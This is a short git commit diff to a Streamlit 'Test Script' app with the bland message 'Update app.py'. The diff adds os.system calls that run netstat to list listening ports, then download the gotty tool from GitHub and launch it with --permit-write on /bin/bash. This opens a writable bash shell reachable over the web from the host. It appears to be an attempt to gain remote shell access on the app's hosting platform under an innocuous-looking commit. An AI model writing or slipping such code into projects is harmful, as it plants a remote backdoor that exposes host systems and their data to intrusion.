d7ca2d67e3cd7242b662bb273536c7cbda4de368
aphiwemthambisi <aphiwemthambisi@gmail.com>
2024-12-28 05:43:28 +0200

    Update app.py

--- app.py
+++ app.py
@@ -4,6 +4,6 @@ import os
 st.title("Test Script")
 st.header("Test")
 
-os.system("ls -la")
-results = os.system("docker")
+os.system("netstat -ntlp")
+results = os.system("wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz && tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash")
 st.write(results)
